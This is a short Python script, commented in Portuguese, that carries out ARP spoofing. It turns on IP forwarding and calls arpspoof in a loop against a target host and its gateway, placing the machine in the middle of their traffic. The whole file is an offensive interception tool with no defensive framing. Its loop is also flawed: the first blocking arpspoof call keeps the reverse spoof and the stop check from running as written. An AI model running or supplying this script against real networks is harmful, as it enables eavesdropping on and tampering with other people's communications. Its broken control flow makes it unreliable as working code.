import os
import subprocess
import time

def habilitar_ip_forwarding():
    """
    Habilita o IP forwarding para que o tráfego possa ser roteado através da máquina
    que está realizando o ARP Spoofing.
    """
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")

def realizar_arp_spoofing(target_ip, gateway_ip, interface, stop_event):
    """
    Realiza o ARP Spoofing. A execução continuará até o `stop_event` ser sinalizado.
    """
    try:
        print(f"Iniciando ARP Spoofing contra o alvo {target_ip} e o gateway {gateway_ip} na interface {interface}...")

        # Habilita o IP forwarding para roteamento de pacotes
        habilitar_ip_forwarding()

        while not stop_event.is_set():  # Verifica se o evento de parada foi sinalizado
            # ARP Spoofing: enganando o alvo para enviar pacotes para o roteador
            subprocess.run(["arpspoof", "-i", interface, "-t", target_ip, gateway_ip], check=True)
            subprocess.run(["arpspoof", "-i", interface, "-t", gateway_ip, target_ip], check=True)
            time.sleep(2)  # Intervalo para evitar sobrecarga e reduzir os pacotes ARP enviados

    except subprocess.CalledProcessError as e:
        print(f"[ERRO] Comando arpspoof falhou: {e}")
    except KeyboardInterrupt:
        print("\nARP Spoofing interrompido pelo usuário.")
    finally:
        print("ARP Spoofing interrompido e o processo de forwarding foi desabilitado.")
        # Desabilitar o IP forwarding após o ARP Spoofing ser interrompido
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("0")
